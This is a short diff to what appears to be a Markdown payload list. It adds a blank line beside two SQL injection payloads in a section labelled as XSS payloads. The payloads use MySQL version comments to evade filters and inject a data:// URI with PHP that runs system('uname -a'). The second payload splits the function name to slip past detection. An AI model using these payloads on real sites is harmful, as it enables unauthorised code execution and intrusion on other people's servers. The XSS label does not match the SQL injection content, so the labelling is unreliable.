@@ -192,6 +192,7 @@
 
 <details>
   <summary>🔴 Click to view a custom list of XSS Payloads</summary>
+  
   ```txt
   ' /*!50000union*/ select 1,2,3,4,5,6,7,8,'data://text/plain,<?php echo system("uname -a");?>'-- -
   ' /*!50000union*/ select 1,2,3,4,5,6,7,8,'data://text/plain,<?php $a="sy";$b="stem";$c=$a.$b; $c("uname -a");?>' -- -
